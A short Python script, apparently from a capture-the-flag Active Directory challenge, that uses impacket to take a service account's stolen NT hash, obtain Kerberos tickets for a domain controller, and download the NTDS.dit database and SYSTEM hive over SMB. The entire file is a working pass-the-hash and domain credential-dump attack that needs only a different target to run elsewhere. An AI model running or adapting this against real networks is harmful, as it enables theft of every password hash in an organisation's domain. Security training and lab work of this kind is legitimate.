import hashlib,io
from pathlib import Path
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT,getKerberosTGS
from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection
user='svc_backup_gmsa$'; domain='VELOCITY.HACKLU'; host='10.244.0.10'; name='dc-new.velocity.hacklu'
nt=Path('/tmp/ad13-ma.VDTOko/svc_backup_gmsa.nthash').read_text().strip(); lm='aad3b435b51404eeaad3b435b51404ee'
tgt,cipher,_,sess=getKerberosTGT(Principal(user,type=constants.PrincipalNameType.NT_PRINCIPAL.value),'',domain,lm,nt,kdcHost=host)
tgs,c2,_,s4=getKerberosTGS(Principal('cifs/'+name,type=constants.PrincipalNameType.NT_SRV_INST.value),domain,host,tgt,cipher,sess)
c=SMBConnection(name,host,timeout=20);c.kerberosLogin(user,'',domain=domain,TGT={'KDC_REP':tgt,'cipher':cipher,'sessionKey':sess},TGS={'KDC_REP':tgs,'cipher':c2,'sessionKey':s4},useCache=False)
out=Path('/mnt/c/Users/m/Downloads/.ctf-workbench/ad13-ma/challenges/AD-13/backup_dump/Export');out.mkdir(parents=True,exist_ok=True)
for remote,filename in [(r'\Export\NTDS.dit','NTDS.dit'),(r'\Export\SYSTEM','SYSTEM')]:
 b=io.BytesIO();c.getFile('Backup$',remote,lambda x:b.write(x));data=b.getvalue();(out/filename).write_bytes(data)
 print(filename,'bytes',len(data),'sha256',hashlib.sha256(data).hexdigest(),flush=True)
c.logoff()
